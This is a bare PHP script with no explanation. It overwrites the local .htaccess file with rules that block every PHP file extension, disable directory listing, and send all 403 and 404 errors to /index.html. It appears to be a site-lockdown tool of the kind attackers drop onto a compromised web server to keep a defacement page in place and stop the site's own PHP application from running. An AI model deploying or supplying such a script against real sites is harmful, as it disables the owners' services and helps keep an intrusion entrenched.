<?php
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "<Files *.php>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.php5>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.php3>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.php7>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.php56>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.shtml>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.phtml>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PhP>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.phps>
    Order Deny,Allow
    Deny from all
</Files>

Options -Indexes

ErrorDocument 403 /index.html
ErrorDocument 404 /index.html
DirectoryIndex index.html";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
?>
